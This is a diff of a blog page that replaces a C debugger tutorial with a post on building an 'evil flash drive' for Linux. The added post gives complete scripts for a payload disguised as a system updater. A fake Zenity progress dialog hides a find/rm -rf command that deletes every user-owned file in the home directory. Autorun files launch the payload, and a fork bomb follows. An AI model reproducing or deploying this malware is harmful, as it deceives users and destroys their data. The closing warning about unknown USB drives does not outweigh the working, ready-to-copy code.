@@ -11,7 +11,7 @@
 
   <title>
     
-      Creating a Barebones Debugger &middot; Nihaal Prasad
+      Basic Evil Flash Drive That Deletes Linux User's Data &middot; Nihaal Prasad
     
   </title>
 
@@ -184,7 +184,7 @@
 
     <main class="container">
       <div class="content">
-  <h1 class="page-heading">Creating a Barebones Debugger</h1>
+  <h1 class="page-heading">Basic Evil Flash Drive That Deletes Linux User's Data</h1>
   <div class="post-meta">
   <span class="post-categories">
     
@@ -193,194 +193,112 @@
 
   <hr>
   <div class="post-body">
-    <p>Today, I will be showing how I created a basic debugger in C. This won’t be a very complicated debugger as it will only allow you to do three things: see the values of the registers, step through one instruction, and read hex values from memory. Obviously, this is nothing compared to something like IDA Pro, but making a basic debugger did help me understand what the debugger is actually doing when we are using it.</p>
+    <p>Today I’m going to be going over how to setup an evil flash drive that can easily destroy the data of whoever runs it. This is a simple program that is mainly coded from just with a few bash files. It will masquerade as an updating software inside a flash drive that will bring up a little pop up saying that it is installing computer updates. Finally, once it is done deleting files that are owned by the user, it will bring up a <a href="https://en.wikipedia.org/wiki/Fork_bomb">fork bomb</a> to crash the computer. Since I use Ubuntu as my main operating system, I’m mainly making this flash drive to target Linux systems. Making a flash drive that targets Windows systems would be slightly different, but the idea would remain the same.</p>
 
-<p>The first thing that we need to do is to run the program we want to debug in a separate process using fork(). The program’s name will be given as a command line argument to our debugger, and any additional arguments that we want to past to the program we are currently debugging can also be passed as arguments. Once we call fork() to make a copy of this process, we will make the child process call <code class="highlighter-rouge">ptrace(PTRACE_TRACEME, 0, 0, 0);</code>, which will let the child process know that it is going to be debugged by the parent process. The <code class="highlighter-rouge">ptrace()</code> function will be used throughout our code as it allows the parent process to control and observe the child process. From there, we will use execv() to actually execute the program that we want to execute. As soon as this happens, the tracee (the program being debugged) stop pause execution on a SIGTRAP, which will be used to prevent the tracee from executing any more code unless the tracer/debugger allows it.</p>
+<p><img style="margin-left: auto; margin-right: auto; width: 25%; height: 25%;" src="../../../assets/img/2019-1-25-flash-drive-that-deletes-everything/updates.png" /></p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>// Represents the PID of the program being debugged
-static int pid = 0;
+<p>So lets jump right into it. I had a flash drive that I just reformatted into <a href="https://en.wikipedia.org/wiki/Ext4">ext4</a>. The first thing that I did was create a folder called “updates” in my flash drive, which would be used to hold majority of the code. My next task was to develop the updater pop-up that you see above. This was quite simple to create; all I did was use a program called <a href="https://en.wikipedia.org/wiki/Zenity">Zenity</a> to bring up the updating window. Zenity is a tool used to easily develop these dialog boxes using commands from the terminal. It was already installed by default on my Ubuntu machine, so it was my natural choice to create the dialog box. By running the below command, I was able to develop the window that you see above:</p>
 
-// Forks this process, runs the given executable using the given arguments, and returns the PID to the parent
-int run(char **argv) {
-    pid = fork();
-
-    // If statement will only execute if we are the child process
-    if(pid == 0) {
-        ptrace(PTRACE_TRACEME, 0, 0, 0); // Allow the parent to trace us
-        execv(argv[1], &amp;(argv[2])); // Execute the program we wanted to execute.
-        // The tracee should stop on SIGTRAP as soon as execv() is called.
-        // This will prevent the tracee from executing any code unless the tracer allows it to using ptrace()
-    }
-}
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>zenity --progress --pulsate --no-cancel --text="Updating..."
 </code></pre></div></div>
 
-<p>Now, the child process has the program that we want to debug loaded up into it, and it has paused execution so that we can start to take control of it as its parent process. Inside our main function, we need to obtain the program that we must run from the command line arguments and call run(). Then we will also use <code class="highlighter-rouge">ptrace(PTRACE_SETOPTIONS, pid, 0, PTRACE_O_EXITKILL);</code> on the parent process so that if the parent exits, then the child process must also exit.</p>
+<p>However, my usage of zenity caused a slight problem. What if this flash drive was going to be put into a system that didn’t have Zenity installed? To solve this problem, I typed in this command to find the location of zenity:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>// Main function
-int main(int argc, char **argv) {
-    // Make sure we have the correct number of arguments
-    if(argc != 2) {
-        printf("Usage: ./debug &lt;program&gt; &lt;additional arguments&gt;\n");
-        exit(0);
-    }
-
-    run(argv); // Run the given executable and obtain its PID
-    ptrace(PTRACE_SETOPTIONS, pid, 0, PTRACE_O_EXITKILL); // Make sure that if the tracer exits, then the tracee must also exit
-    debugger(pid); // Run the debugger
-}
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whereis zenity
 </code></pre></div></div>
 
-<p>The debugger() function is a function that I made to help me process commands inputted by the user. It will parse the command the user types in and calls the correct function to do the action that the user requested. I also made a print_help() function that will print out all of the possible commands that can be used.</p>
+<p>And got this output:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>// Reads a line of input
-void readline(char *input) {
-    // Reads a line of input
-    char buf[500];
-    printf("&gt; ");
-    fgets(input, 500, stdin);
-
-    // Get rid of the '\n' character
-    int len = strlen(input);
-    if(len &gt;= 2 &amp;&amp; input[len-1] == '\n') {
-        input[len-1] = '\0';
-    }
-}
-
-// Prints the help menu
-void print_help() {
-    printf("regs: Prints out the values of each register.\n");
-    printf("step: Executes a single instruction.\n");
-    printf("mem &lt;addr&gt;: Reads the value at the given memory address.\n");
-    printf("quit: Closes the debugger.\n");
-}
-
-// Actual debugger code
-void debugger() {
-    char *input = malloc(500); // Input that the user types in
-
-    // Loop until the user types in "exit"
-    do {
-        readline(input); // Read a command
-
-        // Parse the command
-        if(strncmp("regs", input, 5) == 0 || strncmp("r", input, 2) == 0) {
-            print_regs();
-        } else if(strncmp("step", input, 5) == 0 || strncmp("s", input, 2) == 0) {
-            step();
-        } else if(strncmp("mem ", input, 4) == 0) {
-            strtok(input, " "); // Mem should have a single input parameter, which is the memory address to read in hex
-            read_mem(strtok(NULL, " "));
-        } else if(strncmp("help", input, 5) == 0 || strncmp("h", input, 2) == 0) {
-            print_help();
-        }
-    } while(strncmp(input, "exit", 5) &amp;&amp; strncmp(input, "quit", 5) &amp;&amp; strncmp(input, "q", 2));
-}
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>zenity: /usr/bin/zenity /usr/share/zenity /usr/share/man/man1/zenity.1.gz
 </code></pre></div></div>
 
-<p>The first thing that I will show you how to do is how to read the values of the registers in the debugged program. We will be using the <code class="highlighter-rouge">ptrace(PTRACE_GETREGS, pid, 0, &amp;regs)</code> function to read the values of the registers in the debugged program. The “regs” variable that we’ll use as an input parameter for this function has a type of <code class="highlighter-rouge">struct user_regs_struct</code>, and the ptrace() function will store the values of the registers inside of that variable. The values of the registers can then be easily read by using the regs variable (i.e. use <code class="highlighter-rouge">regs.rax</code> to read the value of rax).</p>
+<p>So, I went ahead and copied the version of zenity located in /usr/bin/zenity to the updates folder located in my flash drive and renamed the program to “updater” so that it was less obvious that it was, in fact, not used for updating your computer. Now my flash drive could run the zenity program directly from the flash drive, which meant that even if this flash drive was put into a computer that did not have zenity installed, it could still run zenity.</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>// Prints out all of the register values inside of the process we're debugging
-void print_regs() {
-    // Create the struct that will contain all of the process' registers
-    struct user_regs_struct regs;
+<p>After that, I needed a script that would run zenity from the flash drive, so I made a file called updates.sh inside the updates folder and put this code inside of it:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+<span class="nb">cd</span> <span class="s2">"</span><span class="k">$(</span><span class="nb">dirname</span> <span class="s2">"</span><span class="nv">$0</span><span class="s2">"</span><span class="k">)</span><span class="s2">"</span>
+./updater <span class="nt">--progress</span> <span class="nt">--pulsate</span> <span class="nt">--no-cancel</span> <span class="nt">--text</span><span class="o">=</span><span class="s2">"Updating..."</span>
+</code></pre></div></div>
+<p>All that this code does is cd into the current directory and run zenity (which I renamed to updater) using the flags that create the window that I wanted.</p>
 
-    // Read the values of each register and store it inside of the struct
-    ptrace(PTRACE_GETREGS, pid, 0, &amp;regs);
+<p>The next step was to create a bash file that could do actual damage to the system. Inside the updates folder, I made a file called “data.sh”, which would be used to destroy the data. I added this code into the file:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+<span class="nb">sleep </span>5
+<span class="nv">x</span><span class="o">=</span><span class="k">$(</span><span class="nb">eval</span> <span class="s2">"whoami"</span><span class="k">)</span>
+find <span class="nv">$HOME</span> <span class="nt">-user</span> <span class="nv">$x</span> <span class="nt">-exec</span> <span class="nb">rm</span> <span class="nt">-rf</span> <span class="o">{}</span> <span class="se">\;</span>
+</code></pre></div></div>
+<p>I added the “sleep 5” command so that the user could view the zenity window for five seconds before watching their files be utterly demolished. The next line of code figures out the user’s username, which is needed to run the next command. The find command that comes right after that will find all of the documents that the user owns and deletes them one by one. I didn’t use rm -rf /, which is the usual way that people delete files, because that requires root permissions to delete most of those files, and I wanted to be able to run this without asking the user for root permissions. That is why I instead use the find command to find files that the user owns instead of wasting my time with files that the user does not have permission to delete anyways.</p>
 
-    // Print out each value
-    printf("rip 0x%llx\n", regs.rip);
-    printf("rax 0x%llx\n", regs.rax);
-    printf("rbx 0x%llx\n", regs.rbx);
-    printf("rcx 0x%llx\n", regs.rcx);
-    printf("rdx 0x%llx\n", regs.rdx);
-    printf("rsi 0x%llx\n", regs.rsi);
-    printf("rdi 0x%llx\n", regs.rdi);
-    printf("rsp 0x%llx\n", regs.rsp);
-    printf("rbp 0x%llx\n", regs.rbp);
-    printf("r8 0x%llx\n", regs.r8);
-    printf("r9 0x%llx\n", regs.r9);
-    printf("r10 0x%llx\n", regs.r10);
-    printf("r11 0x%llx\n", regs.r11);
-    printf("r12 0x%llx\n", regs.r12);
-    printf("r13 0x%llx\n", regs.r13);
-    printf("r14 0x%llx\n", regs.r14);
-    printf("r15 0x%llx\n", regs.r15);
-}
+<p>I also downloaded an icon that looked sort of like an updating computer, and placed that under the updates folder. This icon will eventually be seen on the user’s desktop.</p>
+
+<p>The next thing I did was to go to the root of the flash drive directory (outside the /updates folder), and create a file called Autorun.inf. This is a special file that will tell the operating system certain information about this particular flash drive. I added these lines of code into this file:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[autorun]
+Open=autorun.sh
+Action=Start Updates
+Label=Updater
+Icon=updates/updater.png
+</code></pre></div></div>
+<p>This tells the operating system to open “autorun.sh” by default when this flash drive is connected, use the label of “Updater,” and use the icon located in the updates folder. It looked something like the image below when I reconnected the flash drive.</p>
+
+<p><img style="margin-left: auto; margin-right: auto; width: 25%; height: 25%;" src="../../../assets/img/2019-1-25-flash-drive-that-deletes-everything/icon.png" /></p>
+
+<p>Finally, I only had one more little step to do. I just had to create an autorun.sh file that would run when the flash drive was inserted. (By default, linux will usually bring up a pop-up asking the user “Would you like to run the software on this flash drive?” for security reasons. Technically this will not be run right when the flash drive is inserted, but only after the user allows it to run. If it was not setup like this by default, then that could cause a huge security hole because a malicious user could insert a flash drive into any computer and run whatever they wanted.) I created an autorun.sh file at the root directory of my flash drive and put this inside it:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+
+<span class="nb">cd</span> <span class="s2">"</span><span class="k">$(</span><span class="nb">dirname</span> <span class="s2">"</span><span class="nv">$0</span><span class="s2">"</span><span class="k">)</span><span class="s2">"</span>
+<span class="nb">cd </span>updates
+
+./data.sh | ./updates.sh
+./updater <span class="nt">--info</span> <span class="nt">--text</span><span class="o">=</span><span class="s2">"Your computer has finished all updates."</span>
+
+:<span class="o">(){</span>:|:&amp;<span class="o">}</span><span class="p">;</span>:
+</code></pre></div></div>
+<p>The first thing that this bash file does is that it changes into the directory of the updates folder. After that, it runs data.sh and updates.sh at the same time (The pipette is used so that when data.sh is done deleting all of the files, updates.sh will also stop as well). After that, it will use zenity to print out a message saying “Your computer has finished all updates.” Then the code ends by delivering the fork bomb.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>:() {
+    :|:&amp;
+};
+:
 </code></pre></div></div>
 
-<p>To read any word from memory, we can use <code class="highlighter-rouge">ptrace(PTRACE_PEEKDATA, pid, addr, 0)</code>, where addr is a long representing the address that we want to read from. This function will return a long variable that we can then print out in hex.</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>// Reads the value at the given memory address
-void read_mem(char *addr_input) {
-    // Make sure that the input isn't NULL
-    if(addr_input != NULL) {
-        long addr = strtol(addr_input, 0, 16); // Convert the address from a hex string to a long
-        long data = ptrace(PTRACE_PEEKDATA, pid, addr, 0); // Obtain the data
-        printf("%lx\n", data);
-    }
-}
+<p>A fork bomb, in case you do not know, is a piece of bash code that will usually result in the computer crashing (although many operating systems today will have some defenses setup), and even if the computer doesn’t crash, it will usually slow it down. When you break down the fork bomb, there are three main parts to it (as shown above). 1.) It defines a function called “:” using “:()”. 2.) It opens the body of the function using the curly bracket. Inside the body of the function, it calls itself using “:|:&amp;”. The “&amp;” is used to run something in the background, and the pipette can be used to run another command in the background, so “:|:&amp;” makes the function call itself twice and background it. Each call to “:” spawns even more calls to “:”, leading to an infinitely recursive process that slowly consumes the system resources. 3.) The program will then close the function using “};”, then it will call the function with the last “:”, which begins this whole process. For your convenience, A better looking version of the fork bomb is below:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>foo() {
+    call foo | call foo &amp;
+};
+call foo
 </code></pre></div></div>
+<p>This pretty much wraps up this blog post. All I did now was just set all of my bash files to executable using the “chmod +x [file]” command. I ran the evil flash drive inside an Ubuntu virtual machine, and it worked perfectly. Everything in the user’s home directory was demolished, and a pop up saying “Ubuntu experienced a system error” even came up.</p>
 
-<p>Stepping through a single line of assembly code is even easier. We can just call <code class="highlighter-rouge">ptrace(PTRACE_SINGLESTEP, pid, 0, 0);</code>, which will just execute one line of code.</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>// Steps through a single line of assembly code
-void step() {
-    ptrace(PTRACE_SINGLESTEP, pid, 0, 0);
-}
+<p><img src="../../../assets/img/2019-1-25-flash-drive-that-deletes-everything/runsoftware.png" /></p>
 
-</code></pre></div></div>
+<p>First it asked me whether I wanted to run the software (which was the security issue I mentioned earlier).</p>
 
-<p>Now we should have a working debugger. You can try using this to debug a basic program, and it should work just fine.</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ./debug todebug
-&gt; help
-regs: Prints out the values of each register.
-step: Executes a single instruction.
-mem &lt;addr&gt;: Reads the value at the given memory address.
-quit: Closes the debugger.
-&gt; regs
-rip 0x7fcfb2eee090
-rax 0x0
-rbx 0x0
-rcx 0x0
-rdx 0x0
-rsi 0x0
-rdi 0x0
-rsp 0x7fff2e69c670
-rbp 0x0
-r8 0x0
-r9 0x0
-r10 0x0
-r11 0x0
-r12 0x0
-r13 0x0
-r14 0x0
-r15 0x0
-&gt; mem 0x7fcfb2eee090
-f98e8e78948
-&gt; step
-&gt; r
-rip 0x7fcfb2eee093
-rax 0x0
-rbx 0x0
-rcx 0x0
-rdx 0x0
-rsi 0x0
-rdi 0x7fff2e69c670
-rsp 0x7fff2e69c670
-rbp 0x0
-r8 0x0
-r9 0x0
-r10 0x0
-r11 0x0
-r12 0x0
-r13 0x0
-r14 0x0
-r15 0x0
-&gt; q
-</code></pre></div></div>
+<p><img src="../../../assets/img/2019-1-25-flash-drive-that-deletes-everything/updating.png" /></p>
+
+<p>Then it started to show the pulsating update bar.</p>
+
+<p><img src="../../../assets/img/2019-1-25-flash-drive-that-deletes-everything/doneupdating.png" /></p>
+
+<p>Once it was done deleting all of my files (it didn’t take too long, I didn’t have much in my virtual machine), the updates bar was completely filled.</p>
+
+<p><img src="../../../assets/img/2019-1-25-flash-drive-that-deletes-everything/finishedupdates.png" /></p>
+
+<p>It states that I have completed all of my updates.</p>
+
+<p><img src="../../../assets/img/2019-1-25-flash-drive-that-deletes-everything/thereaintshit.png" /></p>
+
+<p>As you can see, everything in my home folder is now gone. Also, the fork bomb that I implemented earlier is running in the background, making this virtual machine run a lot slower.</p>
+
+<p>While this was just a basic program that could easily be built in a few minutes, much more advanced evil USBs have been built. For example, <a href="https://www.ncsc.gov.uk/content/files/protected_files/guidance_files/The-bad-USB-vulnerability1.pdf">these guys</a> were able to create a USB that could impersonate a different USB peripheral without the user noticing. This just goes to show that you should not plug in any USB flash drive unless you know that does not contain any malicious programs. You should especially never plug in a random USB that you found without knowing and trusting its source.</p>
 
 <section class="related">
   <h3 style="color: black">Related Posts</h3>
   <ul class="post-list">
+    
+      <li style="color: black; font-size: 9;">
+        <a href="/2020/03/07/creating-a-barebones-linux-debugger.html">
+          Creating a Barebones Linux Debugger
+        </a>
+      </li>
     
       <li style="color: black; font-size: 9;">
         <a href="/2020/02/27/cracking-Silva97-login-cipher.html">
@@ -391,12 +309,6 @@ r15 0x0
       <li style="color: black; font-size: 9;">
         <a href="/2020/02/22/reversing-buildString-program.html">
           Reversing the buildString CTF challenge
-        </a>
-      </li>
-    
-      <li style="color: black; font-size: 9;">
-        <a href="/2020/02/21/cracking-d4rkfl0w-crackme-4.html">
-          Cracking D4RKFL0W's Crackme-4
         </a>
       </li>
     
